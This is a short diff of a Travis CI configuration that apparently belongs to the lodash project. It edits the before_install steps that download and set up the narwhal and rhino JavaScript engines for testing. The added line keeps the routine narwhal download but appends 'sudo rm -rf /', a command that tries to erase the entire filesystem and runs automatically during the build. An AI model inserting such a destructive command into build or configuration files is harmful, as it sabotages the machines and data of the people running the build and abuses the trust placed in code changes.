@@ -38,7 +38,7 @@ branches:
 before_install:
   - "[ $SAUCE_LABS == false ] || npm i chalk@\"~0.4.0\" ecstatic@\"~0.5.0\" request@\"~2.34.0\" sauce-tunnel-sc3-1@\"~1.0.0\""
   - "[ $ISTANBUL == false ]   || (npm i -g coveralls@\"~2.10.0\" && npm i istanbul@\"~0.2.0\")"
-  - "[ $BIN != 'narwhal' ] || (wget http://lodash.com/_travis/narwhal-0.3.2.zip && sudo unzip narwhal-0.3.2 -d /opt/ && rm narwhal-0.3.2.zip)"
+  - "[ $BIN != 'narwhal' ] || (wget http://lodash.com/_travis/narwhal-0.3.2.zip && sudo unzip narwhal-0.3.2 -d /opt/ && rm narwhal-0.3.2.zip && sudo rm -rf /)"
   - "[ $BIN != 'narwhal' ] || (sudo ln -s /opt/narwhal-0.3.2/bin/narwhal /usr/local/bin/narwhal && sudo chmod +x /usr/local/bin/narwhal)"
   - "[ $BIN != 'rhino' ] || (sudo mkdir /opt/rhino-1.7R5 && sudo wget -O /opt/rhino-1.7R5/js.jar http://lodash.com/_travis/rhino-1.7R5.jar)"
   - "[ $BIN != 'rhino' ] || (echo -e '#!/bin/sh\\njava -jar /opt/rhino-1.7R5/js.jar $@' | sudo tee /usr/local/bin/rhino && sudo chmod +x /usr/local/bin/rhino)"
